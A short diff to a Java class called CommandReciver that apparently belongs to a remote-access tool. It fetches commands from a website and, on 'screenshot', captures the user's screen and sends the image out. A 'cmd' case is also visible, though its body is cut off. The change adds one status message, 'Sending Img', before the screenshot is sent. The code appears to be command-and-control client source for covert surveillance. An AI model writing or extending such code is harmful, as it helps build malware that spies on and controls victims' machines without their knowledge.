@@ -29,6 +29,7 @@ public class CommandReciver {
             for (String command : getWebsiteCommands()) {
                 switch (command.toLowerCase()) {
                     case "screenshot":
+                        sender.send("commandout", "Sending Img");
                         new ImageSender().sendBytes(new Screenshot().takeScreenshot());
                         break;
                     case "cmd":
